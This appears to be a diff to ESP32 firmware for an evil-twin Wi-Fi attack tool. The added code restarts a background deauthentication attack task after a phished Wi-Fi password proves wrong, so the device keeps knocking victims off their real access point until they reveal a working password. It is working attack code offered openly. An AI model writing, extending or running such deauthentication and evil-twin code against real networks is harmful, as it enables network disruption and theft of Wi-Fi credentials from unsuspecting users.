@@ -621,6 +621,35 @@ static void wifi_event_handler(void *event_handler_arg,
                 if (connectAttemptCount >= 3) {
                     ESP_LOGW(TAG, "Evil twin: Too many failed attempts, giving up and going to DEAUTH_EVIL_TWIN. Btw connectAttemptCount: %d ", connectAttemptCount);
                     applicationState = DEAUTH_EVIL_TWIN; //go back to deauth
+                    
+                    // Resume deauth attack since password was wrong
+                    if (!deauth_attack_active && deauth_attack_task_handle == NULL) {
+                        MY_LOG_INFO(TAG, "Resuming deauth attack - password was incorrect.");
+                        
+                        // Set LED to red for deauth
+                        esp_err_t led_err = led_strip_set_pixel(strip, 0, 255, 0, 0);
+                        if (led_err == ESP_OK) {
+                            led_strip_refresh(strip);
+                        }
+                        
+                        // Start deauth attack in background task
+                        deauth_attack_active = true;
+                        BaseType_t result = xTaskCreate(
+                            deauth_attack_task,
+                            "deauth_task",
+                            4096,  // Stack size
+                            NULL,
+                            5,     // Priority
+                            &deauth_attack_task_handle
+                        );
+                        
+                        if (result != pdPASS) {
+                            MY_LOG_INFO(TAG, "Failed to create deauth attack task!");
+                            deauth_attack_active = false;
+                        } else {
+                            MY_LOG_INFO(TAG, "Deauth attack resumed successfully.");
+                        }
+                    }
                 } else {
                     ESP_LOGW(TAG, "Evil twin: This is just a disconnect, connectAttemptCount: %d, will try again", connectAttemptCount);
                     connectAttemptCount++;
